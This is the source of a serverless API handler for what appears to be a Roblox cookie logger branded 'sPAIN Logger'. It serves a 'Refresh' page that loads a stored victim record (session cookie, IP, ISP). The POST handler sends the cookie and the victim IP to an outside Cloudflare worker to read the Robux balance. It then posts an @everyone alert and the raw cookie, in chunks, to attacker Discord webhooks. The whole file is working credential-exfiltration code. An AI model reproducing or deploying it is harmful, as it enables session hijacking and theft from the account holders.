// api/refresh.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/info';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

// ── Page HTML ─────────────────────────────────────────────────────────────────
function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools — Refresh</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:44px 40px;width:100%;max-width:420px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.2rem;font-weight:900;letter-spacing:0.05em;margin-bottom:6px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .sub{font-size:0.75rem;color:var(--muted);margin-bottom:36px;letter-spacing:0.04em}
  .btn{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:18px;border-radius:14px;font-family:'Orbitron',sans-serif;font-size:0.9rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 36px rgba(192,38,211,0.4);transition:all .2s}
  .btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 0 52px rgba(192,38,211,0.65)}
  .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
  .btn.success{background:linear-gradient(135deg,#16a34a,#22c55e);box-shadow:0 0 36px rgba(34,197,94,0.4)}
  .btn.error{background:linear-gradient(135deg,#dc2626,#ef4444);box-shadow:0 0 36px rgba(239,68,68,0.4)}
  .status{margin-top:16px;font-size:0.78rem;color:var(--muted);min-height:20px;letter-spacing:0.04em}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <div class="sub">Click to refresh and send latest info to Discord</div>
  <button class="btn" id="btn" onclick="doRefresh()">🔄 Refresh</button>
  <div class="status" id="status"></div>
</div>
<script>
const ID = '${id}';
async function doRefresh() {
  const btn    = document.getElementById('btn');
  const status = document.getElementById('status');
  btn.disabled = true;
  btn.textContent = 'Sending...';
  btn.className = 'btn';
  status.textContent = '';
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: ID })
    });
    const d = await r.json();
    if (d.success) {
      btn.className = 'btn success';
      btn.textContent = '✓ Sent to Discord!';
      status.textContent = d.robux !== undefined ? 'Balance: ' + Number(d.robux).toLocaleString() + ' R$' : '';
      setTimeout(() => {
        btn.className = 'btn';
        btn.textContent = '🔄 Refresh';
        btn.disabled = false;
        status.textContent = '';
      }, 3000);
    } else {
      btn.className = 'btn error';
      btn.textContent = '✗ ' + (d.error || 'Failed');
      btn.disabled = false;
      setTimeout(() => { btn.className = 'btn'; btn.textContent = '🔄 Refresh'; }, 3000);
    }
  } catch {
    btn.className = 'btn error';
    btn.textContent = '✗ Network error';
    btn.disabled = false;
    setTimeout(() => { btn.className = 'btn'; btn.textContent = '🔄 Refresh'; }, 3000);
  }
}
</script>
</body>
</html>`;
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ── GET — serve the refresh page ──────────────────────────────────────────
  if (req.method === 'GET') {
    const id = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!id) return res.status(400).send('Missing ID');
    const record = await redisGet(`refresh:${id}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send(`<body style="background:#080810;color:#f472b6;font-family:sans-serif;padding:40px;"><h2>Link expired or not found</h2></body>`);
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(id));
  }

  // ── POST — do the refresh ─────────────────────────────────────────────────
  if (req.method === 'POST') {
    const body = parseBody(req.body);
    const id   = body?.id;
    if (!id) return res.status(400).json({ error: 'id required' });

    const record = await redisGet(`refresh:${id}`);
    if (!record)         return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    // Call Worker to get robux (uses Cloudflare IP — cookie safe)
    let robux = 0;
    let username = '';
    let avatarUrl = '';
    try {
      const r = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: record.cookie, victimIp: record.ip || '' })
      });
      if (r.ok) {
        const d = await r.json();
        if (d.valid) {
          robux     = d.robux     || 0;
          username  = d.username  || '';
          avatarUrl = d.avatarUrl || '';
        }
      }
    } catch (_) {}

    const now      = new Date().toISOString();
    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    // Send embed to Discord
    for (const wh of webhooks) {
      // Info embed
      await discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title:  '🔄 Cookie Refresh',
          color:  0xc026d3,
          thumbnail: { url: avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' },
          fields: [
            { name: '💰 Balance',   value: `\`${Number(robux).toLocaleString()} R$\``, inline: true  },
            { name: '🌐 IP',        value: `\`${record.ip || 'Unknown'}\``,             inline: true  },
            { name: '🗺️ ISP',       value: record.isp || 'Unknown',                    inline: true  },
          ],
          footer:    { text: `sPAIN Logger • ${record.pageName || id} • ${now}` },
          timestamp: now
        }]
      });

      // Raw cookie
      let rem = record.cookie;
      while (rem.length > 0) {
        await discordSend(wh, { content: rem.substring(0, 1990) });
        rem = rem.substring(1990);
      }
    }

    return res.status(200).json({ success: true, robux });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
